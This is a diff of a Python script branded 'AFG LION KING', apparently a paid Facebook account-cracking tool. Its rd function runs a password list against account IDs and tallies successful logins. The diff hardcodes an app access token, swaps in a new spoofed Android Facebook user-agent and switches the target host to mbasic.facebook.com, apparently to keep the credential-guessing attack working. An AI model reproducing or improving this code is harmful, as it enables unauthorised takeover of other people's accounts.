@@ -125,7 +125,7 @@ logo = """\033[1;92m
  \033[1;97m[ \033[1;92m\033[1;92m Author   \033[1;97m \033[1;92m \033[1;97m] \033[1;92m AFG LION KING
  \033[1;97m[ \033[1;92m\033[1;92m WhatsApp\033[1;97m \033[1;92m \033[1;97m] \033[1;92m +93783361438
  \033[1;97m[ \033[1;92m\033[1;92m Status   \033[1;97m \033[1;92m \033[1;97m] \033[97;1m PAID
- \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 0.2
+ \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 0.3
  \033[1;97m----------------------------------------"""
 
 def line():
@@ -492,9 +492,9 @@ def rd(ids,passlist):
 		sys.stdout.write('\r\r\033[1;32m\x1b[1;92m [ AFGLION \x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
 		for pas in passlist:                                          
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-			ua = 'Dalvik/2.1.0 (Linux; Android 8.0.0; RNE-L21 Build/SM-N770F-L21) [FBAN/Orca-Android;FBAV/151.0.0.5444;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/386256256;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-T805|LRX22G;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=787,height=2537};FB_FW/1;FBRV/386256256]'			
+			ua = 'Davik/2.1.0 (linux; U; Android 7.0.1; Vivo Y35 Build/RKQ1.21110.002[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/188497645;FBDM/{density=2.5,width=1080,height=720};FBLC/en_US;FBRV/188497645;FBCR/Telekom China;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Vivo Y35;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'			
 			headers = {
-    'authority': 'm.facebook.com',
+    'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
